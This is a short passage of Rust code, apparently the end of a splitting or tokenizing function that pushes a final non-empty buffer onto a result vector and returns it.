    if !cur.is_empty() { res.push(cur); }
    res
}
